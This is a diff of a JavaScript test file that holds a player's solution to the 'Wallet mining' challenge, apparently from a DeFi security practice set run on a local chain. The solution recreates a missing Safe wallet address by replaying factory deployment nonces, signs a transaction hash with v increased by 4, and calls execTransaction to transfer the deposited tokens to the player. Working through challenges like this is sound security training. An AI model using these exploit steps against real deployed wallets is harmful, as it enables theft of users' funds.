@@ -68,14 +68,13 @@ describe('[Challenge] Wallet mining', function () {
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
 
-        //  Data from https://github.com/safe-global/safe-singleton-factory/blob/main/artifacts/31337/deployment.json
         const data = require("./data.json");
         console.log("Player address is", player.address)
         
         const attackWalletDeployer = walletDeployer.connect(player);
         const attackAuthorizer = authorizer.connect(player);
 
-        const fn = attackAuthorizer.interface.getSighash("can(address,address)");
+        // const fn = attackAuthorizer.interface.getSighash("can(address,address)");
         // console.log(fn);
 
         // Transfer funds to deploying address
@@ -129,17 +128,6 @@ describe('[Challenge] Wallet mining', function () {
             ethers.constants.AddressZero,
         ])
 
-        const setupABIData = createInterface(safeABI, "setup",  [
-            [player.address],
-            1,
-            ethers.constants.AddressZero,
-            0,
-            ethers.constants.AddressZero,
-            ethers.constants.AddressZero,
-            0,
-            ethers.constants.AddressZero,
-        ])
-
         // Find how many addresses required to find the missing address of
         // 0x9b6fb606a9f5789444c17768c6dfcf2f83563801
         let nonceRequired = 0
@@ -157,23 +145,21 @@ describe('[Challenge] Wallet mining', function () {
             await proxyFactory.createProxy(safeContractAddr, setupDummyABIData);
         }
 
+        // Create transfer interface for execTransaction
         const tokenABI = ["function transfer(address to, uint256 amount)"];
         const tokenABIData = createInterface(tokenABI, "transfer", [player.address, DEPOSIT_TOKEN_AMOUNT]);
 
         // 1. need to get transaction hash from here https://github.com/safe-global/safe-contracts/blob/v1.1.1/contracts/GnosisSafe.sol#L398
         // 2. sign transaction hash
-        // 3. send it below
+        // 3. Add 4 to v as per gnosis spec to show it is an eth_sign tx https://docs.gnosis-safe.io/learn/safe-tools/signatures
+        // 3. Send it through exec transaction
 
         const depositAddrSafe = await ethers.getContractAt("GnosisSafe", DEPOSIT_ADDRESS, player);
-        
-        const testFactory = await ethers.getContractFactory("TestSafe", player);
-        const testContr = await testFactory.deploy();
 
-        console.log(await testContr.VERSION());
-        // return;
-
-        // console.log(await depositAddrSafe.VERSION());
+        // Test that we are connected
+        console.log(await depositAddrSafe.VERSION());
         
+        // Params for the execTransaction
         const transactionParams = [
             token.address,
             0,
@@ -187,43 +173,19 @@ describe('[Challenge] Wallet mining', function () {
             0
         ];
 
-        // const txhash = await depositAddrSafe.getTransactionHash(...transactionParams);
-        const txhash = await testContr.getTransactionHash(...transactionParams);
-        console.log("Tx hash from contract:", txhash);
+        // Get hash from contract
+        const txhash = await depositAddrSafe.getTransactionHash(...transactionParams);
+        const signed = await player.signMessage(ethers.utils.arrayify(txhash));
 
-        const txHashBytes = ethers.utils.arrayify(ethers.utils.hashMessage(txhash));
+        // Increase v by 4
+        const signedIncreaseV = ethers.BigNumber.from(signed).add(4).toHexString();
 
-        const signed = await player.signMessage(txHashBytes);
-        console.log("Signed tx hash:", signed);
-
-        // const recovered = ethers.utils.verifyMessage(txHashBytes, signed);
-
-        // console.log(recovered)
-        // console.log(player.address)
-        // return;
-
-        // await depositAddrSafe.execTransaction(...(transactionParams.slice(0, -1)), signed);
-        await testContr.execTransaction(...(transactionParams.slice(0, -1)), signed);
-        return;
-
-        const execTransactionData = createInterface(safeABI, "getTransactionHash", transactionParams)
-
-        return;
-
-
-        console.log(await (await proxyFactory.createProxy(safeContractAddr, ABIData)).wait())
-        // proxyFactory.
-
-        for (let i = 0; i < 47; i++) {
-            const ca = ethers.utils.getContractAddress({
-                from: factoryContractAddr,
-                nonce: i
-            })
-            
-            console.log(ca)
-        }
+        await depositAddrSafe.execTransaction(...(transactionParams.slice(0, -1)), signedIncreaseV);
         
+        const bal = await token.balanceOf(player.address);
+        console.log("Player balance = ", ethers.utils.formatEther(bal))
 
+        
     });
 
     after(async function () {
